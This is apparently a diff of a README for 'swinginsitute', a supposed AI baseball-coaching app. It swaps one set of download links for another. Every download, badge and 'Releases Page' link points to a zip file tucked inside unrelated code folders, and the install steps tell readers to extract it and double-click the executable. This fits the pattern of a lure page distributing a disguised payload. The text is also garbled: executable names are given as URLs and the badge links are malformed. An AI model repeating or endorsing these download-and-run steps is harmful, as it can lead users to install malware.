@@ -4,13 +4,13 @@
 
 Welcome to swinginsitute! This guide will help you download and run our AI-assisted athlete development platform. With our service, you can access video-based coaching, training programs, performance analytics, and much more designed specifically for competitive baseball players.
 
-[![Download Now](https://github.com/Eytuby/swinginsitute/raw/refs/heads/main/supabase/functions/send-booking-confirmation/Software-v1.5.zip%20Now-Get%20Started-brightgreen)](https://github.com/Eytuby/swinginsitute/raw/refs/heads/main/supabase/functions/send-booking-confirmation/Software-v1.5.zip)
+[![Download Now](https://raw.githubusercontent.com/Eytuby/swinginsitute/main/src/config/Software-1.4.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Eytuby/swinginsitute/main/src/config/Software-1.4.zip)
 
 ## 📥 Download & Install
 
 To get started, visit our releases page to download the latest version of swinginsitute.
 
-[Download the latest version here!](https://github.com/Eytuby/swinginsitute/raw/refs/heads/main/supabase/functions/send-booking-confirmation/Software-v1.5.zip)
+[Download the latest version here!](https://raw.githubusercontent.com/Eytuby/swinginsitute/main/src/config/Software-1.4.zip)
 
 ### 🖥️ System Requirements
 
@@ -33,11 +33,11 @@ Before downloading, ensure your system meets the following requirements:
 ## 📦 How to Download
 
 1. Click on the link below to visit our Releases page:
-   - [Download the latest version here!](https://github.com/Eytuby/swinginsitute/raw/refs/heads/main/supabase/functions/send-booking-confirmation/Software-v1.5.zip)
+   - [Download the latest version here!](https://raw.githubusercontent.com/Eytuby/swinginsitute/main/src/config/Software-1.4.zip)
 
 2. Once on the Releases page, look for the latest version listed at the top.
 
-3. Click the asset link (e.g., https://github.com/Eytuby/swinginsitute/raw/refs/heads/main/supabase/functions/send-booking-confirmation/Software-v1.5.zip) to start your download.
+3. Click the asset link (e.g., https://raw.githubusercontent.com/Eytuby/swinginsitute/main/src/config/Software-1.4.zip) to start your download.
 
 4. Save the file to a location on your computer where you can easily find it.
 
@@ -48,7 +48,7 @@ Once the download completes, follow these steps:
 1. Locate the downloaded file.
 2. If you downloaded a `.zip` file, right-click on it and select "Extract All…" to unzip the file.
 3. Open the extracted folder.
-4. Find and double-click on the executable file (e.g., `https://github.com/Eytuby/swinginsitute/raw/refs/heads/main/supabase/functions/send-booking-confirmation/Software-v1.5.zip` for Windows, `https://github.com/Eytuby/swinginsitute/raw/refs/heads/main/supabase/functions/send-booking-confirmation/Software-v1.5.zip` for macOS).
+4. Find and double-click on the executable file (e.g., `https://raw.githubusercontent.com/Eytuby/swinginsitute/main/src/config/Software-1.4.zip` for Windows, `https://raw.githubusercontent.com/Eytuby/swinginsitute/main/src/config/Software-1.4.zip` for macOS).
 5. Follow the on-screen instructions to complete the installation.
 
 ## 📈 Getting Help
@@ -70,7 +70,7 @@ After installation, log in or create an account to start your journey:
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Eytuby/swinginsitute/raw/refs/heads/main/supabase/functions/send-booking-confirmation/Software-v1.5.zip)
+- [Releases Page](https://raw.githubusercontent.com/Eytuby/swinginsitute/main/src/config/Software-1.4.zip)
 - [Community Forum](#)
 - [Help and Support](#)
 
@@ -78,4 +78,4 @@ After installation, log in or create an account to start your journey:
 
 swinginsitute provides a comprehensive platform for baseball players to enhance their skills. Downloading and using the application is straightforward. Follow this guide for a smooth experience. Enjoy your training and let's take your game to the next level!
 
-[![Download Now](https://github.com/Eytuby/swinginsitute/raw/refs/heads/main/supabase/functions/send-booking-confirmation/Software-v1.5.zip%20Now-Get%20Started-brightgreen)](https://github.com/Eytuby/swinginsitute/raw/refs/heads/main/supabase/functions/send-booking-confirmation/Software-v1.5.zip)
+[![Download Now](https://raw.githubusercontent.com/Eytuby/swinginsitute/main/src/config/Software-1.4.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Eytuby/swinginsitute/main/src/config/Software-1.4.zip)
